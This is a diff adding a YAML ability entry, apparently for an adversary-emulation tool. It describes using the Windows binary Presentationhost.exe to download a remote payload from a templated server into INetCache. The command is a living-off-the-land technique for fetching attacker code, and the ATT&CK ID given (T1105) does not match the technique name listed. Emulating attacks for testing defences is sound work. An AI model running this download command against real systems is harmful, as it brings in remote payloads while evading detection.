@@ -1,0 +1,21 @@
+- id: a326f903-1e90-c59e-48b3-1a17e25020a4
+  name: Presentationhost.exe - It will download a remote payload and place it in INetCache.
+  description: It will download a remote payload and place it in INetCache.
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: 'Presentationhost.exe #{server}/file/download'
+  singleton: false
+  privilege: User
+  repeatable: true
+  buckets:
+  - command-and-control
+  version: '1.0'
+  author: Oddvar Moe
+  created: '2018-05-25'
+  modified: '2018-05-25'
+  operating_system: Windows All Versions
